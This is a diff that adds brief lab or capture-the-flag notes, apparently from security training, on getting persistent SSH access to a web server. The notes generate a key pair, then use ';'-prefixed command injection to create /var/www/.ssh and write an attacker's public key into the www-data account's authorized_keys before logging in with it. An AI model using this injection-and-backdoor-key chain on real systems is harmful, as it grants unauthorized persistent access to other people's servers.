@@ -1,0 +1,12 @@
+ ***creating keygen .ssh not present, press enter or y (created in /home/.ssh) id_rsa = private, id_rsa.pub = public 
+      *****must be in the current users home directory 
+          -> ssh-keygen -t rsa -b 4096
+          -> cat .ssh/id_rsa.pub
+          -> ;ls -al var/www/.ssh (authorized keys location)
+          -> cat /var/www/.ssh
+          -> ;mkdir /var/www/.ssh *******************
+          -> ; echo "<ssh -rsa -ssh key- student@lin-ops>" > /var/www/.ssh/authorized_keys 
+      ***** to ssh i (-i is used to utilize a specific key)
+          -> ssh -i .ssh/id_rsa www-data@<ip>
+
+when looking for flags -> cat * | grep title
